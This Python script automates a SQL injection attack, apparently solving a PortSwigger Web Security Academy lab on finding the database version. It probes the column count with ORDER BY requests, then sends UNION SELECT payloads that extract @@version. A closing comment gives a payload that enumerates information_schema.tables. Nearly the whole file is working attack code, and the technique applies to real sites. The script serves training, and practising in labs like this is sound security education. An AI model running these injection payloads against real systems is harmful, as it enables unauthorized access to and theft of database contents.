import requests

session = requests.session()

burp0_url = "https://acec1fbf1edbc5f8c00b7570001500d3.web-security-academy.net:443/filter?category=Tech+gifts"
burp0_cookies = {"session": "TkCYh6eqS7O6YGFsS1N9X8Sy4Nt6hPdr"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://acec1fbf1edbc5f8c00b7570001500d3.web-security-academy.net/filter?category=Pets", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)



# ######################  until here burp paste of request for python  ########################## #

# lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft


cookies = burp0_cookies
headers = burp0_headers
number_of_columns = 0
table = "dual"
columns = "description"
value = "@@version"

# Microsoft
# SELECT @@version
# PostgreSQL
# SELECT version()
# MySQL
# SELECT @@version


def send_request_order_by(number: int):
    url = burp0_url + f"'+ORDER+BY+{number}--+-"
    # print(url)
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response)
    if response.status_code == 200:
        return True
    else:
        return False


def send_payload(number_of_columns, burp0_url):
    nulllist = []
    for i in range(number_of_columns):
        nulllist.append('NULL')

    for ii in range(number_of_columns):
        nulllist[ii] = value
        payload_var = ",".join(nulllist)
        print(payload_var)
        sqli_payload = f"'+UNION+SELECT+{payload_var}+FROM+{table}--+-"
        loaded_url = str(burp0_url + sqli_payload)
        print(loaded_url)
        response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
        print(response)
        nulllist[ii] = "NULL"








if __name__ == '__main__':
    for i in range(4, 0, -1):
        print(f"trying {i}")
        if send_request_order_by(i):
            number_of_columns = i
            print(f"this is the number of columns to UNION BY:\n***   {i}    ***.\nUse it wisely")
            break
    send_payload(number_of_columns, burp0_url)


# PayLoad:
# UNION SELECT NULL,NULL,NULL FROM information_schema.tables--+-

